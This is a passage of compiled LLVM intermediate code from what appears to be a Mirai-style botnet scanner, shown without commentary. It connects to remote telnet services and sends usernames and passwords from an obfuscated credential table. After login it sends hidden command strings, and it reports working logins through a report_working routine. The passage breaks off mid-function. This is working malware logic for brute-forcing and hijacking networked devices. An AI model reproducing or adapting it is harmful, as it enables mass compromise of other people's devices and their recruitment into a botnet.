  %.0.be = phi i32 [ %.0225, %78 ], [ %.0225, %81 ], [ %.0225, %90 ], [ %.0225, %95 ], [ %.0225, %100 ], [ %120, %119 ], [ %.0225, %96 ]
  store i32 0, i32* %70, align 4
  %124 = load i32, i32* @rsck, align 4
  %125 = call i64 @recvfrom(i32 %124, i8* nonnull %53, i64 1514, i32 16384, %struct.sockaddr* null, i32* null) #10
  %126 = trunc i64 %125 to i32
  %127 = icmp slt i32 %126, 1
  br i1 %127, label %.thread.loopexit256, label %.lr.ph226

.thread.loopexit:                                 ; preds = %114
  br label %.thread

.thread.loopexit256:                              ; preds = %.preheader, %.lr.ph226, %.backedge, %116
  br label %.thread

.thread:                                          ; preds = %.thread.loopexit256, %.thread.loopexit, %.loopexit213
  %128 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %55) #10, !srcloc !8
  %129 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %56) #10, !srcloc !9
  store i32 0, i32* %1, align 4
  br label %130

; <label>:130:                                    ; preds = %.thread, %.thread206
  %.0188234 = phi i32 [ 0, %.thread ], [ %.1189, %.thread206 ]
  %.0190233 = phi i32 [ 0, %.thread ], [ %.1191, %.thread206 ]
  %storemerge197232 = phi i32 [ 0, %.thread ], [ %180, %.thread206 ]
  %131 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %132 = sext i32 %storemerge197232 to i64
  %133 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i64 %132
  %134 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i64 %132, i32 3
  %135 = load i32, i32* %134, align 8
  %136 = icmp eq i32 %135, 0
  br i1 %136, label %.thread206, label %137

; <label>:137:                                    ; preds = %130
  %138 = icmp ne i32 %135, 1
  %139 = select i1 %138, i32 30, i32 5
  %140 = load i32, i32* @fake_time, align 4
  %141 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i64 %132, i32 2
  %142 = load i32, i32* %141, align 4
  %143 = sub i32 %140, %142
  %144 = icmp ugt i32 %143, %139
  br i1 %144, label %145, label %159

; <label>:145:                                    ; preds = %137
  %146 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i64 %132, i32 1
  %147 = load i32, i32* %146, align 8
  %148 = call i32 @close(i32 %147) #10
  store i32 -1, i32* %146, align 8
  %149 = load i32, i32* %134, align 8
  %150 = icmp ugt i32 %149, 2
  %151 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i64 %132, i32 8
  br i1 %150, label %152, label %158

; <label>:152:                                    ; preds = %145
  %153 = load i8, i8* %151, align 8
  %154 = add i8 %153, 1
  store i8 %154, i8* %151, align 8
  %155 = icmp eq i8 %154, 10
  br i1 %155, label %156, label %157

; <label>:156:                                    ; preds = %152
  store i8 0, i8* %151, align 8
  store i32 0, i32* %134, align 8
  br label %.thread206

; <label>:157:                                    ; preds = %152
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %133)
  br label %.thread206

; <label>:158:                                    ; preds = %145
  store i8 0, i8* %151, align 8
  store i32 0, i32* %134, align 8
  br label %.thread206

; <label>:159:                                    ; preds = %137
  %cond = icmp eq i32 %135, 1
  %160 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %131, i64 %132, i32 1
  %161 = load i32, i32* %160, align 8
  %162 = srem i32 %161, 64
  %163 = zext i32 %162 to i64
  %164 = shl i64 1, %163
  %165 = sdiv i32 %161, 64
  %166 = sext i32 %165 to i64
  br i1 %cond, label %167, label %173

; <label>:167:                                    ; preds = %159
  %168 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %3, i64 0, i32 0, i64 %166
  %169 = load i64, i64* %168, align 8
  %170 = or i64 %164, %169
  store i64 %170, i64* %168, align 8
  %171 = load i32, i32* %160, align 8
  %172 = icmp sgt i32 %171, %.0190233
  %..0190 = select i1 %172, i32 %171, i32 %.0190233
  br label %.thread206

; <label>:173:                                    ; preds = %159
  %174 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %2, i64 0, i32 0, i64 %166
  %175 = load i64, i64* %174, align 8
  %176 = or i64 %164, %175
  store i64 %176, i64* %174, align 8
  %177 = load i32, i32* %160, align 8
  %178 = icmp sgt i32 %177, %.0188234
  %..0188 = select i1 %178, i32 %177, i32 %.0188234
  br label %.thread206

.thread206:                                       ; preds = %130, %173, %167, %158, %157, %156
  %.1191 = phi i32 [ %.0190233, %156 ], [ %.0190233, %157 ], [ %.0190233, %158 ], [ %..0190, %167 ], [ %.0190233, %173 ], [ %.0190233, %130 ]
  %.1189 = phi i32 [ %.0188234, %156 ], [ %.0188234, %157 ], [ %.0188234, %158 ], [ %.0188234, %167 ], [ %..0188, %173 ], [ %.0188234, %130 ]
  %179 = load i32, i32* %1, align 4
  %180 = add nsw i32 %179, 1
  store i32 %180, i32* %1, align 4
  %181 = icmp slt i32 %180, 256
  br i1 %181, label %130, label %182

; <label>:182:                                    ; preds = %.thread206
  store <2 x i64> <i64 1, i64 0>, <2 x i64>* %4, align 16
  %183 = icmp sgt i32 %.1191, %.1189
  %184 = select i1 %183, i32 %.1191, i32 %.1189
  %185 = add nsw i32 %184, 1
  %186 = call i32 @select(i32 %185, %struct.fd_set.28* nonnull %2, %struct.fd_set.28* nonnull %3, %struct.fd_set.28* null, %struct.timeval.29* nonnull %tmpcast) #10
  %187 = call i64 @time(i64* null) #10
  %188 = trunc i64 %187 to i32
  store i32 %188, i32* @fake_time, align 4
  store i32 0, i32* %1, align 4
  br label %189

; <label>:189:                                    ; preds = %182, %.loopexit
  %storemerge198236 = phi i32 [ 0, %182 ], [ %387, %.loopexit ]
  %190 = load %struct.scanner_connection*, %struct.scanner_connection** @conn_table, align 8
  %191 = sext i32 %storemerge198236 to i64
  %192 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191
  %193 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 1
  %194 = load i32, i32* %193, align 8
  %195 = icmp eq i32 %194, -1
  br i1 %195, label %.loopexit, label %196

; <label>:196:                                    ; preds = %189
  %197 = sdiv i32 %194, 64
  %198 = sext i32 %197 to i64
  %199 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %3, i64 0, i32 0, i64 %198
  %200 = load i64, i64* %199, align 8
  %201 = srem i32 %194, 64
  %202 = zext i32 %201 to i64
  %203 = shl i64 1, %202
  %204 = and i64 %200, %203
  %205 = icmp eq i64 %204, 0
  br i1 %205, label %221, label %206

; <label>:206:                                    ; preds = %196
  store i32 0, i32* %6, align 4
  store i32 4, i32* %7, align 4
  %207 = call i32 @getsockopt(i32 %194, i32 1, i32 4, i8* nonnull %57, i32* nonnull %7) #10
  %208 = load i32, i32* %6, align 4
  %209 = or i32 %208, %207
  %210 = icmp eq i32 %209, 0
  br i1 %210, label %211, label %216

; <label>:211:                                    ; preds = %206
  %212 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 3
  store i32 2, i32* %212, align 8
  %213 = call fastcc %struct.scanner_auth* @random_auth_entry()
  %214 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %192, i64 0, i32 0
  store %struct.scanner_auth* %213, %struct.scanner_auth** %214, align 8
  %215 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 6
  store i32 0, i32* %215, align 4
  %.pre = load i32, i32* %193, align 8
  br label %221

; <label>:216:                                    ; preds = %206
  %217 = load i32, i32* %193, align 8
  %218 = call i32 @close(i32 %217) #10
  store i32 -1, i32* %193, align 8
  %219 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 8
  store i8 0, i8* %219, align 8
  %220 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 3
  store i32 0, i32* %220, align 8
  br label %.loopexit

; <label>:221:                                    ; preds = %196, %211
  %222 = phi i32 [ %194, %196 ], [ %.pre, %211 ]
  %223 = sdiv i32 %222, 64
  %224 = sext i32 %223 to i64
  %225 = getelementptr inbounds %struct.fd_set.28, %struct.fd_set.28* %2, i64 0, i32 0, i64 %224
  %226 = load i64, i64* %225, align 8
  %227 = srem i32 %222, 64
  %228 = zext i32 %227 to i64
  %229 = shl i64 1, %228
  %230 = and i64 %229, %226
  %231 = icmp eq i64 %230, 0
  br i1 %231, label %.loopexit, label %.thread210.preheader

.thread210.preheader:                             ; preds = %221
  %232 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 3
  %233 = load i32, i32* %232, align 8
  %234 = icmp eq i32 %233, 0
  br i1 %234, label %.loopexit, label %.lr.ph235

.lr.ph235:                                        ; preds = %.thread210.preheader
  %235 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 6
  %236 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 7, i64 0
  %237 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 7, i64 64
  %238 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 2
  %239 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %192, i64 0, i32 0
  %240 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 8
  %241 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 4
  %242 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 5
  br label %245

.thread210.loopexit.loopexit:                     ; preds = %270
  br label %.thread210.loopexit

.thread210.loopexit:                              ; preds = %.thread210.loopexit.loopexit, %..thread210.loopexit_crit_edge
  %243 = phi i32 [ %.pre249, %..thread210.loopexit_crit_edge ], [ %271, %.thread210.loopexit.loopexit ]
  %244 = icmp eq i32 %243, 0
  br i1 %244, label %.loopexit.loopexit, label %245

; <label>:245:                                    ; preds = %.lr.ph235, %.thread210.loopexit
  %246 = load i32, i32* %235, align 4
  %247 = icmp eq i32 %246, 256
  br i1 %247, label %248, label %249

; <label>:248:                                    ; preds = %245
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %236, i8* nonnull %237, i64 192, i32 1, i1 false)
  store i32 192, i32* %235, align 4
  br label %249

; <label>:249:                                    ; preds = %248, %245
  store i32 0, i32* %70, align 4
  %250 = load i32, i32* %193, align 8
  %251 = load i32, i32* %235, align 4
  %252 = sext i32 %251 to i64
  %253 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 7, i64 %252
  %254 = sub nsw i32 256, %251
  %255 = call i32 @recv_strip_null(i32 %250, i8* %253, i32 %254, i32 16384)
  switch i32 %255, label %266 [
    i32 0, label %.thread212
    i32 -1, label %256
  ]

.thread212:                                       ; preds = %249
  store i32 104, i32* %70, align 4
  br label %258

; <label>:256:                                    ; preds = %249
  %.pr211 = load i32, i32* %70, align 4
  %257 = icmp eq i32 %.pr211, 11
  br i1 %257, label %.loopexit, label %258

; <label>:258:                                    ; preds = %.thread212, %256
  %259 = load i32, i32* %193, align 8
  %260 = call i32 @close(i32 %259) #10
  store i32 -1, i32* %193, align 8
  %261 = load i8, i8* %240, align 8
  %262 = add i8 %261, 1
  store i8 %262, i8* %240, align 8
  %263 = icmp ugt i8 %262, 9
  br i1 %263, label %264, label %265

; <label>:264:                                    ; preds = %258
  store i8 0, i8* %240, align 8
  store i32 0, i32* %232, align 8
  br label %.loopexit

; <label>:265:                                    ; preds = %258
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %192)
  br label %.loopexit

; <label>:266:                                    ; preds = %249
  %267 = load i32, i32* %235, align 4
  %268 = add nsw i32 %267, %255
  store i32 %268, i32* %235, align 4
  %269 = load i32, i32* @fake_time, align 4
  store i32 %269, i32* %238, align 4
  br label %270

; <label>:270:                                    ; preds = %.thread208, %266
  %271 = load i32, i32* %232, align 8
  switch i32 %271, label %.thread210.loopexit.loopexit [
    i32 2, label %272
    i32 3, label %276
    i32 4, label %290
    i32 5, label %304
    i32 6, label %315
    i32 7, label %326
    i32 8, label %337
    i32 9, label %348
    i32 10, label %359
  ]

; <label>:272:                                    ; preds = %270
  %273 = call fastcc i32 @consume_iacs(%struct.scanner_connection* nonnull %192)
  %274 = icmp sgt i32 %273, 0
  br i1 %274, label %275, label %378

; <label>:275:                                    ; preds = %272
  store i32 3, i32* %232, align 8
  br label %.thread208

; <label>:276:                                    ; preds = %270
  %277 = call fastcc i32 @consume_user_prompt(%struct.scanner_connection* nonnull %192)
  %278 = icmp sgt i32 %277, 0
  br i1 %278, label %279, label %378

; <label>:279:                                    ; preds = %276
  %280 = load i32, i32* %193, align 8
  %281 = load %struct.scanner_auth*, %struct.scanner_auth** %239, align 8
  %282 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %281, i64 0, i32 0
  %283 = load i8*, i8** %282, align 8
  %284 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %281, i64 0, i32 4
  %285 = load i8, i8* %284, align 4
  %286 = zext i8 %285 to i64
  %287 = call i64 @send(i32 %280, i8* %283, i64 %286, i32 16384) #10
  %288 = load i32, i32* %193, align 8
  %289 = call i64 @send(i32 %288, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  store i32 4, i32* %232, align 8
  br label %.thread208

; <label>:290:                                    ; preds = %270
  %291 = call fastcc i32 @consume_pass_prompt(%struct.scanner_connection* nonnull %192)
  %292 = icmp sgt i32 %291, 0
  br i1 %292, label %293, label %378

; <label>:293:                                    ; preds = %290
  %294 = load i32, i32* %193, align 8
  %295 = load %struct.scanner_auth*, %struct.scanner_auth** %239, align 8
  %296 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %295, i64 0, i32 1
  %297 = load i8*, i8** %296, align 8
  %298 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %295, i64 0, i32 5
  %299 = load i8, i8* %298, align 1
  %300 = zext i8 %299 to i64
  %301 = call i64 @send(i32 %294, i8* %297, i64 %300, i32 16384) #10
  %302 = load i32, i32* %193, align 8
  %303 = call i64 @send(i32 %302, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  store i32 5, i32* %232, align 8
  br label %.thread208

; <label>:304:                                    ; preds = %270
  %305 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %192)
  %306 = icmp sgt i32 %305, 0
  br i1 %306, label %307, label %378

; <label>:307:                                    ; preds = %304
  call void @table_unlock_val(i8 zeroext 5)
  %308 = call i8* @table_retrieve_val(i32 5, i32* nonnull %8)
  %309 = load i32, i32* %193, align 8
  %310 = load i32, i32* %8, align 4
  %311 = sext i32 %310 to i64
  %312 = call i64 @send(i32 %309, i8* %308, i64 %311, i32 16384) #10
  %313 = load i32, i32* %193, align 8
  %314 = call i64 @send(i32 %313, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 5)
  store i32 6, i32* %232, align 8
  br label %.thread208

; <label>:315:                                    ; preds = %270
  %316 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %192)
  %317 = icmp sgt i32 %316, 0
  br i1 %317, label %318, label %378

; <label>:318:                                    ; preds = %315
  call void @table_unlock_val(i8 zeroext 6)
  %319 = call i8* @table_retrieve_val(i32 6, i32* nonnull %9)
  %320 = load i32, i32* %193, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = call i64 @send(i32 %320, i8* %319, i64 %322, i32 16384) #10
  %324 = load i32, i32* %193, align 8
  %325 = call i64 @send(i32 %324, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 6)
  store i32 7, i32* %232, align 8
  br label %.thread208

; <label>:326:                                    ; preds = %270
  %327 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %192)
  %328 = icmp sgt i32 %327, 0
  br i1 %328, label %329, label %378

; <label>:329:                                    ; preds = %326
  call void @table_unlock_val(i8 zeroext 4)
  %330 = call i8* @table_retrieve_val(i32 4, i32* nonnull %10)
  %331 = load i32, i32* %193, align 8
  %332 = load i32, i32* %10, align 4
  %333 = sext i32 %332 to i64
  %334 = call i64 @send(i32 %331, i8* %330, i64 %333, i32 16384) #10
  %335 = load i32, i32* %193, align 8
  %336 = call i64 @send(i32 %335, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 4)
  store i32 8, i32* %232, align 8
  br label %.thread208

; <label>:337:                                    ; preds = %270
  %338 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %192)
  %339 = icmp sgt i32 %338, 0
  br i1 %339, label %340, label %378

; <label>:340:                                    ; preds = %337
  call void @table_unlock_val(i8 zeroext 7)
  %341 = call i8* @table_retrieve_val(i32 7, i32* nonnull %11)
  %342 = load i32, i32* %193, align 8
  %343 = load i32, i32* %11, align 4
  %344 = sext i32 %343 to i64
  %345 = call i64 @send(i32 %342, i8* %341, i64 %344, i32 16384) #10
  %346 = load i32, i32* %193, align 8
  %347 = call i64 @send(i32 %346, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 7)
  store i32 9, i32* %232, align 8
  br label %.thread208

; <label>:348:                                    ; preds = %270
  %349 = call fastcc i32 @consume_any_prompt(%struct.scanner_connection* nonnull %192)
  %350 = icmp sgt i32 %349, 0
  br i1 %350, label %351, label %378

; <label>:351:                                    ; preds = %348
  call void @table_unlock_val(i8 zeroext 8)
  %352 = call i8* @table_retrieve_val(i32 8, i32* nonnull %12)
  %353 = load i32, i32* %193, align 8
  %354 = load i32, i32* %12, align 4
  %355 = sext i32 %354 to i64
  %356 = call i64 @send(i32 %353, i8* %352, i64 %355, i32 16384) #10
  %357 = load i32, i32* %193, align 8
  %358 = call i64 @send(i32 %357, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.14, i64 0, i64 0), i64 2, i32 16384) #10
  call void @table_lock_val(i8 zeroext 8)
  store i32 10, i32* %232, align 8
  br label %.thread208

; <label>:359:                                    ; preds = %270
  %360 = call fastcc i32 @consume_resp_prompt(%struct.scanner_connection* nonnull %192)
  %361 = icmp eq i32 %360, -1
  br i1 %361, label %362, label %370

; <label>:362:                                    ; preds = %359
  %363 = load i32, i32* %193, align 8
  %364 = call i32 @close(i32 %363) #10
  store i32 -1, i32* %193, align 8
  %365 = load i8, i8* %240, align 8
  %366 = add i8 %365, 1
  store i8 %366, i8* %240, align 8
  %367 = icmp eq i8 %366, 10
  br i1 %367, label %368, label %369

; <label>:368:                                    ; preds = %362
  store i8 0, i8* %240, align 8
  store i32 0, i32* %232, align 8
  br label %.thread208

; <label>:369:                                    ; preds = %362
  call fastcc void @setup_connection(%struct.scanner_connection* nonnull %192)
  br label %.thread208

; <label>:370:                                    ; preds = %359
  %371 = icmp sgt i32 %360, 0
  br i1 %371, label %372, label %378

; <label>:372:                                    ; preds = %370
  %373 = load i32, i32* %241, align 4
  %374 = load i16, i16* %242, align 8
  %375 = load %struct.scanner_auth*, %struct.scanner_auth** %239, align 8
  call fastcc void @report_working(i32 %373, i16 zeroext %374, %struct.scanner_auth* %375)
  %376 = load i32, i32* %193, align 8
  %377 = call i32 @close(i32 %376) #10
  store i32 -1, i32* %193, align 8
  store i32 0, i32* %232, align 8
  br label %.thread208

; <label>:378:                                    ; preds = %370, %348, %337, %326, %315, %304, %290, %276, %272
  %.0192 = phi i32 [ %360, %370 ], [ %349, %348 ], [ %338, %337 ], [ %327, %326 ], [ %316, %315 ], [ %305, %304 ], [ %291, %290 ], [ %277, %276 ], [ %273, %272 ]
  %379 = icmp eq i32 %.0192, 0
  br i1 %379, label %..thread210.loopexit_crit_edge, label %.thread208

..thread210.loopexit_crit_edge:                   ; preds = %378
  %.pre249 = load i32, i32* %232, align 8
  br label %.thread210.loopexit

.thread208:                                       ; preds = %275, %279, %293, %307, %318, %329, %340, %351, %372, %369, %368, %378
  %.0192209 = phi i32 [ %.0192, %378 ], [ %273, %275 ], [ %277, %279 ], [ %291, %293 ], [ %305, %307 ], [ %316, %318 ], [ %327, %329 ], [ %338, %340 ], [ %349, %351 ], [ %360, %372 ], [ -1, %369 ], [ -1, %368 ]
  %380 = load i32, i32* %235, align 4
  %381 = icmp sgt i32 %.0192209, %380
  %..0192 = select i1 %381, i32 %380, i32 %.0192209
  %382 = sub nsw i32 %380, %..0192
  store i32 %382, i32* %235, align 4
  %383 = sext i32 %..0192 to i64
  %384 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %190, i64 %191, i32 7, i64 %383
  %385 = sext i32 %382 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* nonnull %236, i8* %384, i64 %385, i32 1, i1 false)
  br label %270

.loopexit.loopexit:                               ; preds = %.thread210.loopexit
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.thread210.preheader, %256, %221, %265, %264, %189, %216
  %386 = load i32, i32* %1, align 4
  %387 = add nsw i32 %386, 1
  store i32 %387, i32* %1, align 4
  %388 = icmp slt i32 %387, 256
  br i1 %388, label %189, label %.loopexit213.loopexit
}

declare i32 @util_local_addr() local_unnamed_addr #3

declare void @rand_init() local_unnamed_addr #3

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @add_auth_entry(i8*, i8*, i16 zeroext) unnamed_addr #0 {
  %4 = alloca i32, align 4
  %5 = load i8*, i8** bitcast (%struct.scanner_auth** @auth_table to i8**), align 8
  %6 = load i32, i32* @auth_table_len, align 4
  %7 = add nsw i32 %6, 1
  %8 = sext i32 %7 to i64
  %9 = mul nsw i64 %8, 24
  %10 = tail call i8* @realloc(i8* %5, i64 %9) #10
  store i8* %10, i8** bitcast (%struct.scanner_auth** @auth_table to i8**), align 8
  %11 = call fastcc i8* @deobf(i8* %0, i32* nonnull %4)
  %12 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %13 = load i32, i32* @auth_table_len, align 4
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %12, i64 %14, i32 0
  store i8* %11, i8** %15, align 8
  %16 = load i32, i32* %4, align 4
  %17 = trunc i32 %16 to i8
  %18 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %19 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %18, i64 %14, i32 4
  store i8 %17, i8* %19, align 4
  %20 = call fastcc i8* @deobf(i8* %1, i32* nonnull %4)
  %21 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %22 = load i32, i32* @auth_table_len, align 4
  %23 = sext i32 %22 to i64
  %24 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23, i32 1
  store i8* %20, i8** %24, align 8
  %25 = load i32, i32* %4, align 4
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23, i32 5
  store i8 %26, i8* %27, align 1
  %28 = load i16, i16* @auth_table_max_weight, align 2
  %29 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23, i32 2
  store i16 %28, i16* %29, align 8
  %30 = add i16 %28, %2
  %31 = add nsw i32 %22, 1
  store i32 %31, i32* @auth_table_len, align 4
  %32 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %21, i64 %23, i32 3
  store i16 %30, i16* %32, align 2
  store i16 %30, i16* @auth_table_max_weight, align 2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @setup_connection(%struct.scanner_connection*) unnamed_addr #0 {
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = bitcast %struct.sockaddr_in* %2 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 16, i32 4, i1 false)
  %4 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 1
  %5 = load i32, i32* %4, align 8
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %9, label %7

; <label>:7:                                      ; preds = %1
  %8 = tail call i32 @close(i32 %5) #10
  br label %9

; <label>:9:                                      ; preds = %1, %7
  %10 = tail call i32 @socket(i32 2, i32 1, i32 0) #10
  store i32 %10, i32* %4, align 8
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %32, label %12

; <label>:12:                                     ; preds = %9
  %13 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 6
  store i32 0, i32* %13, align 4
  %14 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 7, i64 0
  tail call void @util_zero(i8* %14, i32 256) #10
  %15 = load i32, i32* %4, align 8
  %16 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 3, i32 0) #10
  %17 = or i32 %16, 2048
  %18 = tail call i32 (i32, i32, ...) @fcntl(i32 %15, i32 4, i32 %17) #10
  %19 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 0
  store i16 2, i16* %19, align 4
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 4
  %21 = load i32, i32* %20, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  store i32 %21, i32* %22, align 4
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 5
  %24 = load i16, i16* %23, align 8
  %25 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 1
  store i16 %24, i16* %25, align 2
  %26 = load i32, i32* @fake_time, align 4
  %27 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 2
  store i32 %26, i32* %27, align 4
  %28 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %0, i64 0, i32 3
  store i32 1, i32* %28, align 8
  %29 = load i32, i32* %4, align 8
  %30 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %31 = call i32 @connect(i32 %29, %struct.sockaddr* nonnull %30, i32 16) #10
  br label %32

; <label>:32:                                     ; preds = %9, %12
  ret void
}

declare i32 @select(i32, %struct.fd_set.28*, %struct.fd_set.28*, %struct.fd_set.28*, %struct.timeval.29*) local_unnamed_addr #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

; Function Attrs: noinline norecurse nounwind readonly uwtable
define internal fastcc %struct.scanner_auth* @random_auth_entry() unnamed_addr #5 {
  %1 = load i32, i32* @auth_table_len, align 4
  %2 = icmp sgt i32 %1, 0
  br i1 %2, label %.lr.ph, label %._crit_edge

.lr.ph:                                           ; preds = %0
  %3 = load %struct.scanner_auth*, %struct.scanner_auth** @auth_table, align 8
  %4 = sext i32 %1 to i64
  br label %5

; <label>:5:                                      ; preds = %.lr.ph, %13
  %indvars.iv = phi i64 [ 0, %.lr.ph ], [ %indvars.iv.next, %13 ]
  %6 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %3, i64 %indvars.iv, i32 2
  %7 = load i16, i16* %6, align 8
  %8 = icmp eq i16 %7, 0
  br i1 %8, label %9, label %13

; <label>:9:                                      ; preds = %5
  %10 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %3, i64 %indvars.iv, i32 3
  %11 = load i16, i16* %10, align 2
  %12 = icmp eq i16 %11, 0
  br i1 %12, label %13, label %._crit_edge9

; <label>:13:                                     ; preds = %9, %5
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %14 = icmp slt i64 %indvars.iv.next, %4
  br i1 %14, label %5, label %._crit_edge.loopexit

._crit_edge9:                                     ; preds = %9
  %15 = getelementptr inbounds %struct.scanner_auth, %struct.scanner_auth* %3, i64 %indvars.iv
  br label %._crit_edge

._crit_edge.loopexit:                             ; preds = %13
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %._crit_edge9, %0
  %.0 = phi %struct.scanner_auth* [ %15, %._crit_edge9 ], [ null, %0 ], [ null, %._crit_edge.loopexit ]
  ret %struct.scanner_auth* %.0
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #6

; Function Attrs: noinline nounwind uwtable
define i32 @recv_strip_null(i32, i8*, i32, i32) local_unnamed_addr #0 {
  %5 = sext i32 %2 to i64
  %6 = tail call i64 @recv(i32 %0, i8* %1, i64 %5, i32 %3) #10
  %7 = trunc i64 %6 to i32
  %8 = icmp sgt i32 %7, 0
  br i1 %8, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %4
  %wide.trip.count = and i64 %6, 4294967295
  %min.iters.check = icmp ult i64 %wide.trip.count, 32
  br i1 %min.iters.check, label %.lr.ph.preheader77, label %min.iters.checked

min.iters.checked:                                ; preds = %.lr.ph.preheader
  %n.mod.vf = and i64 %6, 31
